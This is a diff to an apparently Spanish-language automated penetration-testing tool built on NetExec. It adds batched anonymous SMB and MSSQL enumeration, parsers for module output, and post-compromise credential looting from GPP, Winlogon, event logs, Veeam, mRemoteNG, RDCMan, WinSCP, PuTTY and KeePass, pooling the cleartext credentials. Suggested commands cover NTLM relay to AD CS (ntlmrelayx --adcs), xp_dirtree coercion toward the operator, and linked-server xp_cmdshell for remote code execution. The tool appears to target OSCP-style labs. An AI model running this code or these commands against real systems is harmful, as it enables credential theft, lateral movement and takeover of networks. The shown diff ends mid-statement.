@@ -3353,6 +3353,44 @@ def fp_smb(ip, ports, services, host, deep, base=None):
                 "SMB: servicio WebClient (WebDAV) activo — superficie de coacción NTLM alternativa: "
                 "'coercer coerce' con un listener HTTP (no SMB) puede forzar al equipo a autenticarse "
                 "contra un servidor WebDAV propio, sin depender del spooler ni de MS-EFSR"))
+        # ── Lote SMB-anon (OSCP-safe, SIN credenciales, RPC anónimo): recon ADCS + ioxid ──
+        # enum_ca: RPC anónimo a MS-ICPR para enumerar Certificate Authorities (precondición
+        # de AD CS / ESC1-8) — confirmado en nxc/modules/enum_ca.py.
+        # ioxidresolver: RPC anónimo a MS-OXID para identificar interfaces adicionales del host
+        # (equipos multi-homed, VPNs, VLANs internas que nmap no vería desde fuera).
+        _anon_mods = ("enum_ca", "ioxidresolver")
+        rc, _aout = run_capture([nxc, "smb", ip, "-u", "", "-p", ""] + [a for m in _anon_mods for a in ("-M", m)],
+                                timeout=60)
+        _ashown = f"{nxc} smb {ip} -u '' -p '' " + " ".join(f"-M {m}" for m in _anon_mods)
+        _aper = _nxc_split_by_module(_aout or "", _anon_mods)
+        _ahit = False
+        _step(res, _ashown, False, _aout or "",
+              note="SMB anon batched: enum_ca (CAs ADCS por RPC anónimo) + ioxidresolver (interfaces adicionales del host) — SOLO LECTURA")
+        # enum_ca
+        ca_info = _parse_enum_ca(_aper["enum_ca"])
+        if ca_info["found"]:
+            _ahit = True
+            if ca_info["esc8"]:
+                res["findings"].append(("critica",
+                    "SMB: AD CS presente y Web Enrollment por HTTP (ESC8) habilitado — relay NTLM contra "
+                    "la URL /certsrv emite certificados a nombre de la cuenta coerced. Vía estándar: "
+                    "'ntlmrelayx -t http://<CA>/certsrv/certfnsh.asp --adcs' + coerción (spooler/petitpotam)"))
+            if ca_info["urls"]:
+                res["findings"].append(("info",
+                    f"SMB: AD CS CA(s) detectada(s) — {', '.join(ca_info['urls'][:3])}"
+                    + (" …" if len(ca_info["urls"]) > 3 else "")))
+        # ioxidresolver
+        ioxid_ips = _parse_ioxidresolver(_aper["ioxidresolver"])
+        if ioxid_ips:
+            _ahit = True
+            # Filtra la IP del propio objetivo (es la trivial, no es "adicional")
+            others = [a for a in ioxid_ips if a != ip]
+            if others:
+                res["findings"].append(("info",
+                    f"SMB: ioxidresolver — interface(s) adicional(es) del host (multi-homed): "
+                    + ", ".join(others[:5]) + (" …" if len(others) > 5 else "")
+                    + " — superficie para pivoting lateral si alguna es alcanzable"))
+        res["steps"][-1]["ok"] = _ahit
         if is_domain_controller(services):
             # Zerologon (CVE-2020-1472): SIN credenciales, contra CUALQUIER DC (parcheado o
             # no — nxc hace la comprobación, no el exploit). Es de los primeros checks que
@@ -4509,6 +4547,8 @@ def fp_mssql(ip, ports, services, host, deep):
     res = _fp("mssql", "MSSQL", [p["port"] for p in ports])
     nxc = nxc_bin()
     if nxc:
+        _mssql_auth_ok = False
+        _mssql_auth_user = None
         for user, lbl in (("sa", "'sa' sin contraseña"), ("", "sesión nula (Windows auth)")):
             rc, out = run_capture([nxc, "mssql", ip, "-u", user, "-p", ""], timeout=40)
             ok = _nxc_ok(out)
@@ -4519,7 +4559,57 @@ def fp_mssql(ip, ports, services, host, deep):
                 res["next"].append(f"nxc mssql {ip} -u {user or 'USER'} -p '' -x 'whoami'   # si hay exec habilitado, RCE")
                 res["next"].append(f"impacket-mssqlclient {user or 'sa'}:''@{ip}  ->  EXEC master..xp_dirtree '\\\\TU_IP\\share', 1, 1   # fuerza auth NTLM saliente hacia ti (coerción, misma familia que PrinterBug) — captúrala con responder/ntlmrelayx")
                 res["next"].append(f"impacket-mssqlclient {user or 'sa'}:''@{ip}  ->  EXEC sp_linkedservers; luego EXECUTE('SELECT 1') AT [servidor_enlazado]   # pivota a otra instancia SQL si hay linked servers configurados")
+                _mssql_auth_ok = True
+                _mssql_auth_user = user
                 break
+        # ── Lote MSSQL (OSCP-safe, SOLO LECTURA) tras login válido ──
+        # enum_logins/enum_links/enum_impersonate: queries de catálogo contra sys.*; mssql_cbt:
+        # checkea Channel Binding. nxc no tiene '-M mssql_dumper' como safe por defecto (busca
+        # texto en TODAS las tablas; útil pero puede ser ruidoso — queda como paso MANUAL).
+        if _mssql_auth_ok:
+            _m_auth = _mssql_auth_user or "sa"
+            _mssql_mods = ("enum_logins", "enum_links", "enum_impersonate", "mssql_cbt")
+            rc, _mout = run_capture(
+                [nxc, "mssql", ip, "-u", _m_auth, "-p", ""] + [a for m in _mssql_mods for a in ("-M", m)],
+                timeout=120, quiet=True)
+            _mshown = f"{nxc} mssql {ip} -u {shlex.quote(_m_auth)} -p '' " + " ".join(f"-M {m}" for m in _mssql_mods)
+            _mper = _nxc_split_by_module(_mout or "", _mssql_mods)
+            _mhit = False
+            _step(res, _mshown, False, _mout or "",
+                  note="MSSQL batched: enumeración de logins/linked servers/impersonación/CBT — SOLO LECTURA")
+            logins = _parse_enum_logins(_mper["enum_logins"])
+            if logins:
+                _mhit = True
+                sysadmins = [l for l, t, s in logins if "sysadmin" in (t + s).lower()]
+                res["findings"].append(("info",
+                    f"MSSQL: {len(logins)} login(s) enumerado(s) — primeros: "
+                    + ", ".join(l for l, _, _ in logins[:5]) + (" …" if len(logins) > 5 else "")))
+                if sysadmins:
+                    res["findings"].append(("alta",
+                        f"MSSQL: sysadmins visibles — {', '.join(sysadmins[:5])}"))
+            links = _parse_enum_links(_mper["enum_links"])
+            if links:
+                _mhit = True
+                _ml_txt = (f"MSSQL: linked server(s) — {', '.join(links[:5])} — pivot a otras instancias "
+                           "(EXECUTE AT; si el linked server corre como sysadmin, RCE directa)")
+                res["findings"].append(("alta", _ml_txt))
+                _attach_cmd(res, _ml_txt, [
+                    f"impacket-mssqlclient {_m_auth}:''@{ip}   # luego: EXECUTE('xp_cmdshell ''whoami''') AT [{links[0]}]   # paso MANUAL (si el linked corre sysadmin)"])
+            imps = _parse_enum_impersonate(_mper["enum_impersonate"])
+            if imps:
+                _mhit = True
+                _mi_txt = (f"MSSQL: la cuenta '{_m_auth}' puede IMPERSONAR a {', '.join(imps[:5])} "
+                           "(EXECUTE AS LOGIN). Si alguno es sysadmin → RCE. Explotable con nxc -M mssql_priv o manual")
+                res["findings"].append(("alta", _mi_txt))
+                _attach_cmd(res, _mi_txt, [
+                    f"nxc mssql {ip} -u {shlex.quote(_m_auth)} -p '' -M mssql_priv -o IMPERSONATE={imps[0]}   # paso MANUAL: el módulo 'mssql_priv' ACTIVA xp_cmdshell e intenta ejecutar comandos — NUNCA se encadena solo"])
+            # Channel Binding: si NO está activo, los logins NTLM son relayables
+            cbt_lines = _nxc_payload_lines(_mper["mssql_cbt"])
+            if any("not enabled" in l.lower() or "disabled" in l.lower() for l in cbt_lines):
+                _mhit = True
+                res["findings"].append(("media",
+                    "MSSQL: Channel Binding Token NO activo — autenticaciones NTLM relayables (NTLM relay to MSSQL)"))
+            res["steps"][-1]["ok"] = _mhit
     else:
         res["missing"].append("nxc/netexec")
     for lbl, txt in _nse_for(services, host, ("ms-sql",)):
@@ -7515,6 +7605,459 @@ def _parse_lsassy(out):
     return creds, tickets
 
 
+# ── Lanzador batched de módulos nxc + parsers por módulo ─────────────────────────────────
+# Operator-asked: "audita todos los módulos de nxc con todos sus protocolos; implementa los
+# OSCP-safe, los no OSCP-safe implementalos como manuales, y si puedes como el de backup_operator
+# (comprobación no autoexplotable; si cumple el estado, lo recomiendas en paso manual)".
+#
+# nxc acepta '-M a -M b -M c' en una sola invocación (action='append' en nxc/cli.py) y los corre
+# en secuencia dentro de la MISMA conexión — mucho más barato que N llamadas separadas. El logger
+# de nxc antepone a cada línea el nombre del módulo (truncado a 11 car. + '...' si es más largo —
+# ver nxc/logger.py), lo que permite separar la salida por módulo para parsear cada una por
+# separado. Las líneas que llevan el nombre del PROTOCOLO (SMB/LDAP/MSSQL…) son banners de
+# conexión/login y se ignoran como "no vienen de un módulo".
+_NXC_PROTO_PREFIXES = ("SMB", "LDAP", "WINRM", "RDP", "MSSQL", "WMI", "SSH", "FTP", "NFS", "VNC")
+
+
+def _nxc_modname_trunc(n):
+    """Versión truncada del nombre del módulo tal como nxc la imprime en la 1ª columna —
+    confirmado en nxc/logger.py: si len>11, se corta a los 8 primeros + '...'."""
+    return (n[:8] + "...") if len(n) > 11 else n
+
+
+def _nxc_split_by_module(out, module_names):
+    """Divide la salida de un batched 'nxc ... -M a -M b -M c' en sub-salidas por módulo.
+    Devuelve dict {module_name_original: '\\n'.join(lines)} — las líneas de banner del
+    protocolo (SMB/LDAP/…) se descartan. Puro → testeable sin red."""
+    trunc_to_orig = [(_nxc_modname_trunc(n), n) for n in module_names]
+    per_mod = {n: [] for n in module_names}
+    for line in (out or "").splitlines():
+        if not line.strip():
+            continue
+        m = re.match(r"^(\S+)\s", line)
+        if not m:
+            continue
+        first = m.group(1)
+        if first in _NXC_PROTO_PREFIXES:
+            continue   # banner del protocolo, no es un módulo
+        for trunc, orig in trunc_to_orig:
+            if first == trunc:
+                per_mod[orig].append(line)
+                break
+    return {n: "\n".join(lines) for n, lines in per_mod.items()}
+
+
+def _nxc_payload_lines(sub_out):
+    """Líneas payload (log.highlight = SIN marcador [+]/[-]/[*]) de una sub-salida ya troceada
+    por _nxc_split_by_module. Mismo patrón que _parse_lsassy/_parse_iis_appcmd. Puro."""
+    payloads = []
+    for raw in (sub_out or "").splitlines():
+        line = raw.rstrip()
+        if not line.strip():
+            continue
+        m = _LSASSY_PREFIX_RE.match(line)
+        payload = m.group(1) if m else line
+        if payload.startswith("["):   # banner [+]/[-]/[*]/[!] — nunca payload real
+            continue
+        payloads.append(payload)
+    return payloads
+
+
+# ── Parsers por módulo (OSCP-safe: SOLO LECTURA de salida; no explotan ni escriben) ──────
+def _parse_gpp_autologin(out):
+    """context.log.highlight(f'Usernames: {usernames}'), 'Passwords: {passwords}',
+    'Domains: {domains}' — confirmado en nxc/modules/gpp_autologin.py. Devuelve listas por
+    clave; vacías si no hubo hallazgo."""
+    data = {"usernames": [], "passwords": [], "domains": []}
+    for payload in _nxc_payload_lines(out):
+        m = re.match(r"^(Usernames?|Passwords?|Domains?):\s*(.+)$", payload)
+        if not m:
+            continue
+        key = m.group(1).rstrip("s").lower() + "s"
+        # Valor es un str-repr de lista Python: "['user1', 'user2']"
+        items = re.findall(r"'([^']*)'", m.group(2))
+        data[key] = items
+    return data
+
+
+def _parse_reg_winlogon(out):
+    """context.log.highlight(f'{reg_key}: {reg_value}') por cada clave leída del registro
+    (Winlogon) — confirmado en nxc/modules/reg-winlogon.py. Devuelve dict con las claves
+    típicas: AutoAdminLogon, DefaultDomainName, DefaultUserName, DefaultPassword."""
+    data = {}
+    for payload in _nxc_payload_lines(out):
+        m = re.match(r"^(AutoAdminLogon|DefaultDomainName|DefaultUserName|DefaultPassword):\s*(.*)$", payload)
+        if m:
+            data[m.group(1)] = m.group(2).strip()
+    return data
+
+
+def _parse_eventlog_creds(out):
+    """context.log.highlight('Username: U') seguido de 'Password: P' por cada acierto
+    (regex sobre Event ID 4688/Sysmon) — confirmado en nxc/modules/eventlog_creds.py.
+    Devuelve [(username, password)]."""
+    users, pwds = [], []
+    for payload in _nxc_payload_lines(out):
+        m = re.match(r"^Username:\s*(.+)$", payload)
+        if m:
+            users.append(m.group(1).strip())
+            continue
+        m = re.match(r"^Password:\s*(.+)$", payload)
+        if m:
+            pwds.append(m.group(1).strip())
+    return list(zip(users, pwds))
+
+
+def _parse_powershell_history(out):
+    """context.log.highlight('C:\\<file_path> [ KW1 KW2 ]') por cada fichero de historial con
+    palabras clave sensibles (passw, pwd, key, token, secret…). El módulo también dumpea CADA
+    LÍNEA del historial (highlight '\\t<line>') — aquí SOLO devolvemos los ficheros marcados
+    con keywords, no las líneas sueltas (se dejan para que el operador las lea en la salida
+    cruda del paso)."""
+    files_with_kw = []
+    for payload in _nxc_payload_lines(out):
+        m = re.match(r"^(C:\\\S+)\s+\[\s+(.+?)\s+\]$", payload)
+        if m:
+            files_with_kw.append((m.group(1), m.group(2).strip().split()))
+    return files_with_kw
+
+
+def _parse_veeam(out):
+    """context.log.highlight('{Description}: {UserName}:{Password}') — formato confirmado en
+    nxc/modules/veeam.py (bloque de highlight al final de dump_v11/dump_v12). Devuelve
+    [(usuario, secreto, descripción)]; cuando hay base-64 encoded sin descifrar queda
+    reflejado en la 'descripción'."""
+    creds = []
+    for payload in _nxc_payload_lines(out):
+        # 'Description: user:pass' o 'Description :: user : password' — tolerante
+        m = re.match(r"^(.+?)[:\s]+(\S+?):(\S+)$", payload)
+        if m:
+            creds.append((m.group(2).strip(), m.group(3).strip(), m.group(1).strip()))
+    return creds
+
+
+def _parse_mremoteng(out):
+    """mremoteng imprime con log.success/log.info — confirmado en nxc/modules/mremoteng.py:
+    tras 'Found confCons.xml file' va una línea 'User:/Password:/Host:' por entrada. Devuelve
+    [(user, password, host)]."""
+    creds = []
+    user = pwd = host = None
+    for payload in _nxc_payload_lines(out):
+        m = re.match(r"^Username:\s*(.+)$", payload); user = m.group(1).strip() if m else user
+        m = re.match(r"^Password:\s*(.+)$", payload); pwd = m.group(1).strip() if m else pwd
+        m = re.match(r"^(?:Host|Hostname):\s*(.+)$", payload); host = m.group(1).strip() if m else host
+        if user and pwd:
+            creds.append((user, pwd, host or ""))
+            user = pwd = host = None
+    return creds
+
+
+def _parse_rdcman(out):
+    """rdcman imprime con context.log.success('Looting RDCMan secrets') seguido de highlights
+    por entrada — confirmado en nxc/modules/rdcman.py. Formato típico (tras masterkeys):
+    'profileName=P server=S username=U password=P'. Devuelve [(user, password, server)]."""
+    creds = []
+    for payload in _nxc_payload_lines(out):
+        # Dploot-style key=value sequence (toleramos tanto 'Username:' como 'username =')
+        um = re.search(r"(?:username|user)[\s:=]+(\S+)", payload, re.I)
+        pm = re.search(r"(?:password|pass)[\s:=]+(\S+)", payload, re.I)
+        sm = re.search(r"(?:server|host|hostname)[\s:=]+(\S+)", payload, re.I)
+        if um and pm:
+            creds.append((um.group(1), pm.group(1), sm.group(1) if sm else ""))
+    return creds
+
+
+def _parse_winscp(out):
+    """context.log.highlight('=======Session=======') / 'HostName:' / 'UserName:' / 'Password:'
+    por sesión — confirmado en nxc/modules/winscp.py. Devuelve [(session, host, user, pw)]."""
+    creds = []
+    session = host = user = pwd = None
+    for payload in _nxc_payload_lines(out):
+        m = re.match(r"^=======(.+)=======$", payload)
+        if m:
+            if session and (user or pwd):
+                creds.append((session, host or "", user or "", pwd or ""))
+            session, host, user, pwd = m.group(1), None, None, None
+            continue
+        m = re.match(r"^HostName:\s*(.+)$", payload); host = m.group(1).strip() if m else host
+        m = re.match(r"^UserName:\s*(.+)$", payload); user = m.group(1).strip() if m else user
+        m = re.match(r"^Password:\s*(.+)$", payload); pwd = m.group(1).strip() if m else pwd
+    if session and (user or pwd):
+        creds.append((session, host or "", user or "", pwd or ""))
+    return creds
+
+
+def _parse_putty_sessions(out):
+    """putty imprime (tras 'Private key found for user'): 'Sessionname: S' / 'Host: H:port' /
+    'Protocol: P' — confirmado en nxc/modules/putty.py. Devuelve [(session, host, protocol)].
+    El propio módulo descarga la clave privada a tu máquina (nxc_path/modules/putty)."""
+    sessions = []
+    name = host = proto = None
+    for payload in _nxc_payload_lines(out):
+        m = re.match(r"^Sessionname:\s*(.+)$", payload); name = m.group(1).strip() if m else name
+        m = re.match(r"^Host:\s*(.+)$", payload); host = m.group(1).strip() if m else host
+        m = re.match(r"^Protocol:\s*(.+)$", payload); proto = m.group(1).strip() if m else proto
+        if name and host:
+            sessions.append((name, host, proto or "ssh"))
+            name = host = proto = None
+    return sessions
+
+
+def _parse_keepass_discover(out):
+    """context.log.highlight('Found process "X" with PID N (user U)') / 'Found FILE' —
+    confirmado en nxc/modules/keepass_discover.py. Devuelve {'processes':[(name,pid,user)],
+    'files':[path]}."""
+    procs, files = [], []
+    for payload in _nxc_payload_lines(out):
+        m = re.match(r'^Found process "([^"]+)" with PID (\d+) \(user ([^)]+)\)$', payload)
+        if m:
+            procs.append((m.group(1), m.group(2), m.group(3)))
+            continue
+        m = re.match(r"^Found (.+)$", payload)
+        if m:
+            files.append(m.group(1).strip())
+    return {"processes": procs, "files": files}
+
+
+# ── Parsers de módulos "detección/estado" (una línea con el estado) ──────────────────────
+def _parse_bitlocker(out):
+    """'BitLocker is enabled on drive X ...' / 'BitLocker is disabled on drive X' —
+    confirmado en nxc/modules/bitlocker.py. Devuelve [(drive, enabled_bool)]."""
+    drives = []
+    for payload in _nxc_payload_lines(out):
+        m = re.match(r"^BitLocker is (enabled|disabled) on drive (\S+)", payload)
+        if m:
+            drives.append((m.group(2), m.group(1) == "enabled"))
+    return drives
+
+
+def _parse_runasppl(out):
+    """'RunAsPPL enabled' / 'RunAsPPL disabled' — confirmado en nxc/modules/runasppl.py.
+    Devuelve True (enabled), False (disabled), None (no dato)."""
+    for payload in _nxc_payload_lines(out):
+        if payload == "RunAsPPL enabled":
+            return True
+        if payload == "RunAsPPL disabled":
+            return False
+    return None
+
+
+def _parse_uac(out):
+    """'UAC Status: 1 (UAC Enabled)' / '0 (UAC Disabled)' — confirmado en nxc/modules/uac.py.
+    Devuelve True/False/None."""
+    for payload in _nxc_payload_lines(out):
+        m = re.match(r"^UAC Status:\s*(\d)", payload)
+        if m:
+            return m.group(1) == "1"
+    return None
+
+
+def _parse_install_elevated(out):
+    """'AlwaysInstallElevated Status: 0 (Disabled)' / '1 (Enabled: Computer Only)' / '1 (Enabled)'.
+    Devuelve 0/1/2 → 0=off, 1=solo computer, 2=full (enabled)."""
+    for payload in _nxc_payload_lines(out):
+        if "AlwaysInstallElevated Status: 1 (Enabled: Computer Only)" in payload:
+            return 1
+        if "AlwaysInstallElevated Status: 1 (Enabled)" in payload:
+            return 2
+        if "AlwaysInstallElevated Status: 0" in payload:
+            return 0
+    return None
+
+
+def _parse_ntlmv1(out):
+    """nxc/modules/ntlmv1.py: 'The host supports NTLMv1' (vulnerable) / '... supports NTLMv2 only'.
+    Devuelve True/False/None."""
+    for payload in _nxc_payload_lines(out):
+        if "NTLMv1" in payload and "support" in payload.lower():
+            return True
+        if "NTLMv2" in payload and "support" in payload.lower():
+            return False
+    return None
+
+
+def _parse_spooler(out):
+    """'Spooler service enabled' — confirmado en nxc/modules/spooler.py."""
+    for payload in _nxc_payload_lines(out):
+        if "Spooler service enabled" in payload:
+            return True
+        if "Spooler service disabled" in payload:
+            return False
+    return None
+
+
+def _parse_printnightmare(out):
+    """'Vulnerable, next step https://github.com/ly4k/PrintNightmare' — confirmado en
+    nxc/modules/printnightmare.py."""
+    return any("Vulnerable" in p and "PrintNightmare" in p for p in _nxc_payload_lines(out))
+
+
+def _parse_remove_mic(out):
+    """'Potentially vulnerable to CVE-2019-1040, next step: ...' — confirmado en
+    nxc/modules/remove-mic.py."""
+    return any("CVE-2019-1040" in p for p in _nxc_payload_lines(out))
+
+
+def _parse_enum_cve(out):
+    """nxc/modules/enum_cve.py imprime para cada CVE aplicable:
+    'CVE-xxxx - alias - message' (y, línea aparte, 'Exploitation details: …'). Devuelve
+    [(cve, message)]. Split por ' - ' (3 car.) en vez de regex con [^-]+? porque los alias
+    reales traen guiones (p.ej. 'PetitPotam-like')."""
+    cves = []
+    for payload in _nxc_payload_lines(out):
+        m = re.match(r"^(CVE-\d{4}-\d+)\s*-\s*(.+)$", payload)
+        if m:
+            parts = m.group(2).split(" - ", 1)   # 'alias - message' partido solo en el PRIMER ' - '
+            msg = parts[1].strip() if len(parts) == 2 else parts[0].strip()
+            cves.append((m.group(1), msg))
+    return cves
+
+
+def _parse_enum_av(out):
+    """nxc/modules/enum_av.py imprime 'Found NOTHING!' o lista de AVs (una por highlight)."""
+    avs = []
+    for payload in _nxc_payload_lines(out):
+        if payload == "Found NOTHING!":
+            return []
+        avs.append(payload)
+    return avs
+
+
+def _parse_msol(out):
+    """nxc/modules/msol.py imprime via log.highlight el AADInternals dump
+    (incluye 'cloudsa' + password). Devuelve la lista de líneas payload para que el llamante
+    las deje en el informe tal cual (el formato real varía con la versión del servidor)."""
+    return _nxc_payload_lines(out)
+
+
+# ── Parsers LDAP enum ──
+def _parse_dump_computers(out):
+    """nxc/modules/dump-computers.py: por cada equipo, highlight 'name   ip   os' (tabulado).
+    Devuelve [(hostname, ip_o_vacio, os_o_vacio)]."""
+    comps = []
+    for payload in _nxc_payload_lines(out):
+        # Entradas tipo: 'DC01.htb.local  192.168.1.10  Windows Server 2022'
+        parts = payload.split()
+        if len(parts) >= 1 and "." in parts[0]:
+            comps.append((parts[0], parts[1] if len(parts) > 1 else "", " ".join(parts[2:]) if len(parts) > 2 else ""))
+    return comps
+
+
+def _parse_get_info_users(out):
+    """nxc/modules/get-info-users.py: 'User: NAME  Info: INFO' — confirmado en su source.
+    Devuelve [(user, info)]."""
+    users = []
+    for payload in _nxc_payload_lines(out):
+        m = re.match(r"^User:\s*(\S+)\s+Info:\s*(.+?)\s*$", payload)
+        if m:
+            users.append((m.group(1).strip(), m.group(2).strip()))
+    return users
+
+
+def _parse_get_user_password(out):
+    """nxc/modules/get-userPassword.py: 'User: NAME userPassword: PW' — confirmado en su source."""
+    users = []
+    for payload in _nxc_payload_lines(out):
+        m = re.match(r"^User:\s*(\S+)\s+userPassword:\s*(.+?)\s*$", payload)
+        if m:
+            users.append((m.group(1).strip(), m.group(2).strip()))
+    return users
+
+
+def _parse_get_unix_user_password(out):
+    """nxc/modules/get-unixUserPassword.py: 'User: NAME unixUserPassword: PW'."""
+    users = []
+    for payload in _nxc_payload_lines(out):
+        m = re.match(r"^User:\s*(\S+)\s+unixUserPassword:\s*(.+?)\s*$", payload)
+        if m:
+            users.append((m.group(1).strip(), m.group(2).strip()))
+    return users
+
+
+def _parse_subnets(out):
+    """nxc/modules/subnets.py: 'Site "NAME"' / 'Site "NAME" (Subnet:S)' — confirmado."""
+    sites = set()
+    subnets = set()
+    for payload in _nxc_payload_lines(out):
+        m = re.match(r'^Site "([^"]+)"(?:\s*\(Subnet:([^)]+)\))?', payload)
+        if m:
+            sites.add(m.group(1))
+            if m.group(2):
+                subnets.add(m.group(2))
+    return list(sites), list(subnets)
+
+
+def _parse_gpp_privileges(out):
+    """nxc/modules/gpp_privileges.py: 'PrivilegeName: trustee1, trustee2' por cada priv
+    extraído del GPO Default Domain Policy."""
+    privs = []
+    for payload in _nxc_payload_lines(out):
+        m = re.match(r"^(Se[A-Z]\w+(?:Privilege|Right)):\s*(.+?)\s*$", payload)
+        if m:
+            privs.append((m.group(1), [t.strip() for t in m.group(2).split(",") if t.strip()]))
+    return privs
+
+
+# ── Parsers MSSQL ──
+def _parse_enum_logins(out):
+    """nxc/modules/enum_logins.py: tabla 'Login Name | Type | Status' tras highlight con
+    cabecera; cada fila una highlight. Devuelve [(login, type, status)], descartando cabecera
+    y separadores."""
+    rows = []
+    for payload in _nxc_payload_lines(out):
+        if payload.startswith("Login Name") or set(payload) <= set("- "):
+            continue
+        parts = re.split(r"\s{2,}", payload.strip())
+        if len(parts) >= 3:
+            rows.append((parts[0], parts[1], parts[2]))
+    return rows
+
+
+def _parse_enum_impersonate(out):
+    """nxc/modules/enum_impersonate.py: tras '[+] Users with impersonation rights:', una
+    highlight por login impersonable. Devuelve lista de logins."""
+    users = []
+    for payload in _nxc_payload_lines(out):
+        if payload and not payload.startswith("Users with"):
+            users.append(payload.strip())
+    return users
+
+
+def _parse_enum_links(out):
+    """nxc/modules/enum_links.py: tras '[+] Linked servers found:', una highlight por servidor."""
+    servers = []
+    for payload in _nxc_payload_lines(out):
+        if payload and not payload.startswith("Linked servers"):
+            servers.append(payload.strip())
+    return servers
+
+
+# ── Parsers SMB anonymous ──
+def _parse_enum_ca(out):
+    """nxc/modules/enum_ca.py: 'Active Directory Certificate Services Found.' + URLs."""
+    found = False
+    urls = []
+    esc8 = False
+    for payload in _nxc_payload_lines(out):
+        if "Certificate Services Found" in payload:
+            found = True
+        elif payload.startswith("http"):
+            urls.append(payload.strip())
+        elif "Web enrollment found on HTTP" in payload:
+            esc8 = True
+    return {"found": found, "urls": urls, "esc8": esc8}
+
+
+def _parse_ioxidresolver(out):
+    """nxc/modules/ioxidresolver.py: 'Address: X.X.X.X' por cada interfaz adicional detectada."""
+    addrs = []
+    for payload in _nxc_payload_lines(out):
+        m = re.match(r"^Address:\s*(\S+)$", payload)
+        if m:
+            addrs.append(m.group(1))
+    return addrs
+
+
 def _dump_sam_lsa(res, nxc, ip, u, p, port=None, dp=None, local_auth=False, is_hash=False, pool=None):
     """Tras un Pwn3d! confirmado por SMB (Fase 5d), encadena automáticamente un volcado de
     SAM (hashes de cuentas locales), LSA secrets (claves DPAPI, NL$KM, credenciales de
@@ -7707,6 +8250,251 @@ def _dump_sam_lsa(res, nxc, ip, u, p, port=None, dp=None, local_auth=False, is_h
                 if secret:
                     bare = re.split(r"[\\/]", user)[-1]
                     _pool_add(pool, bare, secret, False)
+
+        # ── Lote 1 (OSCP-safe, SOLO LECTURA): "cofres de credenciales" tras Pwn3d! ──────
+        # Batched en UNA sola llamada nxc ('-M a -M b -M c …') — comparte conexión SMB y
+        # reduce el runtime a los 15 módulos en una ~sola cadena en vez de 15 llamadas.
+        # Cada módulo del lote hace SOLO LECTURA (registro, SYSVOL, DB de apps). Si falta
+        # el programa en el objetivo, nxc falla limpio por módulo; los demás siguen.
+        _loot_mods = ("gpp_autologin", "reg-winlogon", "eventlog_creds", "powershell_history",
+                      "veeam", "mremoteng", "rdcman", "winscp", "putty", "keepass_discover")
+        rc5, out5 = run_capture(base_cmd + [a for m in _loot_mods for a in ("-M", m)],
+                                timeout=240, quiet=True)
+        out5 = out5 or ""
+        safe_out5 = _mask_out(out5, p)
+        per5 = _nxc_split_by_module(out5, _loot_mods)
+        _loot_hit = False
+        _loot_shown = shown_base + " " + " ".join(f"-M {m}" for m in _loot_mods)
+        _step(res, _loot_shown, False, safe_out5,   # 'False' provisional, se actualiza abajo
+              note="Pwn3d! por SMB → batched: cofres de credenciales en SYSVOL/registro/aplicaciones "
+                   "(GPP autologon, Winlogon, event log, PowerShell history, Veeam, mRemoteNG, RDCMan, "
+                   "WinSCP, PuTTY, KeePass) — SOLO LECTURA por módulo; si falta en el objetivo, falla limpio")
+        # gpp_autologin
+        gpp_a = _parse_gpp_autologin(per5["gpp_autologin"])
+        if gpp_a["usernames"] and gpp_a["passwords"]:
+            _loot_hit = True
+            for user, pw in zip(gpp_a["usernames"], gpp_a["passwords"]):
+                res["findings"].append(("critica",
+                    f"GPP autologon: credencial en TEXTO CLARO vía SYSVOL/Registry.xml — «{user}:{pw}»"))
+                if pool is not None:
+                    _pool_add(pool, user, pw, False)
+        # reg-winlogon
+        reg_w = _parse_reg_winlogon(per5["reg-winlogon"])
+        reg_u = reg_w.get("DefaultUserName") or ""
+        reg_p = reg_w.get("DefaultPassword") or ""
+        if reg_u and reg_p:
+            _loot_hit = True
+            res["findings"].append(("critica",
+                f"Winlogon: autologon configurado en el registro — «{reg_u}:{reg_p}» (DefaultUserName/DefaultPassword)"))
+            if pool is not None:
+                _pool_add(pool, reg_u, reg_p, False)
+        # eventlog_creds
+        ev_creds = _parse_eventlog_creds(per5["eventlog_creds"])
+        for user, pw in ev_creds:
+            _loot_hit = True
+            res["findings"].append(("critica",
+                f"EventLog: credencial filtrada en Event ID 4688/Sysmon — «{user}:{pw}» "
+                "(línea de comandos con -u/-p; comprobar también en logs locales)"))
+            if pool is not None:
+                _pool_add(pool, user, pw, False)
+        # powershell_history
+        ps_files = _parse_powershell_history(per5["powershell_history"])
+        if ps_files:
+            _loot_hit = True
+            for path, kws in ps_files:
+                res["findings"].append(("alta",
+                    f"PowerShell history ({path}): palabras sensibles [{', '.join(kws)}] — "
+                    "revisa la salida cruda del paso para ver las líneas completas"))
+        # veeam
+        vcreds = _parse_veeam(per5["veeam"])
+        for user, pw, desc in vcreds:
+            _loot_hit = True
+            res["findings"].append(("critica",
+                f"Veeam: credencial en DB SQL de Veeam — «{user}:{pw}» ({desc})"))
+            if pool is not None:
+                _pool_add(pool, user, pw, False)
+        # mremoteng
+        mcreds = _parse_mremoteng(per5["mremoteng"])
+        for user, pw, host_ in mcreds:
+            _loot_hit = True
+            res["findings"].append(("critica",
+                f"mRemoteNG: credencial en confCons.xml — «{user}:{pw}»"
+                + (f" (host {host_})" if host_ else "")))
+            if pool is not None:
+                _pool_add(pool, user, pw, False)
+        # rdcman
+        rcreds = _parse_rdcman(per5["rdcman"])
+        for user, pw, server in rcreds:
+            _loot_hit = True
+            res["findings"].append(("critica",
+                f"RDCMan: credencial en RDCMan.settings — «{user}:{pw}»"
+                + (f" (server {server})" if server else "")))
+            if pool is not None:
+                _pool_add(pool, user, pw, False)
+        # winscp
+        wcreds = _parse_winscp(per5["winscp"])
+        for sess, host_, user, pw in wcreds:
+            _loot_hit = True
+            res["findings"].append(("critica",
+                f"WinSCP: credencial en sesión '{sess}' — «{user}:{pw}»"
+                + (f" (host {host_})" if host_ else "")))
+            if pool is not None and user and pw:
+                _pool_add(pool, user, pw, False)
+        # putty
+        psess = _parse_putty_sessions(per5["putty"])
+        if psess:
+            _loot_hit = True
+            res["findings"].append(("alta",
+                f"PuTTY: {len(psess)} sesión(es) con clave privada SSH descargada(s) a tu máquina — "
+                + ", ".join(f"{n}@{h}" for n, h, _ in psess[:5])
+                + (" …" if len(psess) > 5 else "")
+                + " (probar con 'ssh -i <ruta-local>' contra el host de cada sesión)"))
+        # keepass_discover: proceso encontrado = precondición de keepass_trigger (paso MANUAL)
+        kp = _parse_keepass_discover(per5["keepass_discover"])
+        kp_running = bool(kp["processes"])
+        if kp["files"]:
+            _loot_hit = True
+            res["findings"].append(("alta",
